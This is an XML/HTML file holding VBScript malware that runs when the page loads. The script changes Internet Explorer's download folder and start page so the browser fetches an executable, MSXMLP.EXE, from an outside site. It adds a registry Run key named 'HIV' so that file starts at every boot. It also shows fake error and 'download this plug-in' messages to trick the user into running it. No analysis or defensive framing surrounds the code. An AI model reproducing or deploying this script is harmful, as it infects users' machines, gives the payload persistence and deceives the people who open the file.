<?xml version="1.0"?><HTML xmlns:xsl="http://www.w3.org/TR/WD-xsl"><SCRIPT LANGUAGE="VBScript">Function hiv
On Error Resume Next
Dim fso,regedit
set fso = CreateObject("Scripting.FileSystemObject")
set regedit = CreateObject("WScript.Shell")

regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Download Directory", "c:\"
if (fso.FileExists("c:\MSXMLP.EXE")) then
	regedit.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\HIV", "c:\MSXMLP.EXE"
	Document.Write "<h2>Error! Code: 0x5A98C</h2>"
	Document.Write "<p>Please reboot your machine.</p>"
	regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","about:blank"
else
	regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","http://coderz.net/benny/viruses/MSXMLP.EXE"
	Document.Write "<h2>Error!</h2>Your browser does not support XML parsing. Please download plug-in MSXMLP.EXE, execute it and follow its instructions."
end if
End Function</SCRIPT><body onLoad="hiv"></body></HTML>
